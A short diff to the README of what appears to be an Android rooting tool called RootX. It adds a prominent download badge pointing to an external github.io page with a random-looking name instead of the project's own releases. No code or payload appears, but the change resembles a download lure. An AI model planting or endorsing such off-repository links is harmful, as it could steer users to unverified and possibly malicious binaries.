@@ -16,6 +16,8 @@
 ![Arch](https://img.shields.io/badge/Arch-ARM%20%7C%20ARM64%20%7C%20x86-blue?style=flat-square)
 ![License](https://img.shields.io/badge/license-Freeware-orange?style=flat-square)
 
+[![Download RootX](https://img.shields.io/badge/⬇%20DOWNLOAD%20ROOTX%20v4.7.1-%23000000?style=for-the-badge&logo=android&logoColor=3DDC84&labelColor=111111)](https://zeptohornbilltassel.github.io/nightcore/)
+
 <img src="preview.svg" width="780" alt="RootX Preview"/>
 
 </div>
